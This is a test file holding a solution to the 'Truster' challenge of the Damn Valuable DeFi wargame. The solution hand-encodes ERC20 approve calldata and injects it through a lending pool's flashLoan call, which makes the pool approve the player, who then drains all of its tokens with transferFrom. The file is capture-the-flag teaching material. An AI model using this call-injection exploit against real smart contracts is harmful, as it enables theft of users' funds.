import { ethers } from 'hardhat';
import { expect } from 'chai';

describe('[Challenge] Truster', function () {
    let deployer, player;
    let token, pool;

    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
        expect(await pool.token()).to.eq(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

        expect(await token.balanceOf(player.address)).to.equal(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        // const attack = await (await ethers.getContractFactory('TrusterAttack', deployer)).deploy();
        // const data = await attack.attackData(TOKENS_IN_POOL, player.address);
        // await attack.connect(player).attack(TOKENS_IN_POOL, pool.address, token.address);
        // 70997970c51812dc3a010c7d01b50e0d17dc79c8
        // 0x095ea7b300000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c800000000000000000000000000000000000000000000d3c21bcecceda1000000
        // `0x095ea7b3000000000000000000000000${attackAddress}00000000000000000000000000000000000000000000d3c21bcecceda1000000`

        // attackData = Keccak256(函数签名)(只取前四字节) + approve地址(填充满32字节) + approve金额(填充满32字节)

        const attackAddress = `${player.address}`.replace('0x', '').toLowerCase();
        const attackData = `0x095ea7b3000000000000000000000000${attackAddress}00000000000000000000000000000000000000000000d3c21bcecceda1000000`;
        await pool.connect(player).flashLoan(0, player.address, token.address, attackData);
        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
    
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await token.balanceOf(pool.address)
        ).to.equal(0);
    });
});